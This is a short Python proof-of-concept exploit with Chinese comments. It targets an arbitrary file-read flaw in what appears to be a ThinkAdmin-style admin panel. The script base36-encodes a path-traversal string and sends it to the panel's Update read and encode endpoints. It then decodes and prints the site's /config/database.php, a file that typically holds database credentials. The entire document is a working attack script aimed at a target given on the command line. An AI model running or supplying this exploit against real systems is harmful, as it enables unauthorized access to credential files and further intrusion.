#!/usr/bin/env python3

import sys
import json
import base64 
import requests
import warnings
warnings.filterwarnings("ignore")


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'
}

def encode(num, b):

    """
    对请求的文件名进行编码

    :param str num: 要编码的字符
    :param int b: 编码位数

    :return str result,'错误原因'
    """

    return ((num == 0) and "0") or \
        (encode(num // b, b).lstrip("0") +
        "0123456789abcdefghijklmnopqrstuvwxyz"[num % b])

def check(site):
    """
    检测是否存在漏洞

    :param:

    :return bool True or False: 是否存在漏洞
    """
    
    try:
        file_prefix_list = ['/', 'application/admin/../../../../../../../']
        path_name_list = ['/admin.html?s=admin/api.Update/read/', '/admin.html?s=admin/api.Update/get/encode/']
        for file_prefix in file_prefix_list:
            for path_name in path_name_list:
                payload = file_prefix + '/config/database.php'
                payload = payload.encode('utf-8')
                poc = ""
                for i in payload:
                    poc += encode(i, 36)
                link = site + path_name + poc
                try:
                    req = requests.get(link, headers = headers, verify=False)
                    if req.status_code == 200:
                        json_data = req.json()['data']
                        if json_data:
                            print("读取文件：/config/database.php", "\n","文件内容：", "\n", base64.b64decode(json_data['content']).decode())
                            return True 
                except Exception as e:
                    print(e)
                    pass
    except Exception as e:
        print(e)
        pass

if __name__=="__main__":
    check(sys.argv[1])
